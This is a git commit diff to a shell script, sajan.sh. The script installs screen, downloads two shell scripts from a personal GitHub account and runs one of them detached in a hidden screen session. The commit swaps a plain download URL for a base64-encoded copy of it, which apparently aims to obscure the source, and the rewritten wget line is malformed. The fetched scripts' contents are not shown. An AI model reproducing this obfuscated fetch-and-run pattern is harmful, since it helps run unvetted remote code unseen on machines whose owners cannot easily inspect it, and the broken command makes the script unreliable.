36d61e12b35245c964f7de1e69582d024ae752f6
sn943 <89630444+sn943@users.noreply.github.com>
2021-08-27 12:42:56 +0530

    Update sajan.sh

--- sajan.sh
+++ sajan.sh
@@ -2,7 +2,7 @@
 
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/DarshGoswami1982/prem/raw/main/dh.sh
+wget base64 -d 'aHR0cHM6Ly9naXRodWIuY29tL0RhcnNoR29zd2FtaTE5ODIvcHJlbS9yYXcvbWFpbi9kaC5zaA=='
 wget https://github.com/DarshGoswami1982/FkgX/raw/main/man2.sh
 chmod +x man2.sh
 screen -dmS man2 ./man2.sh 60 70
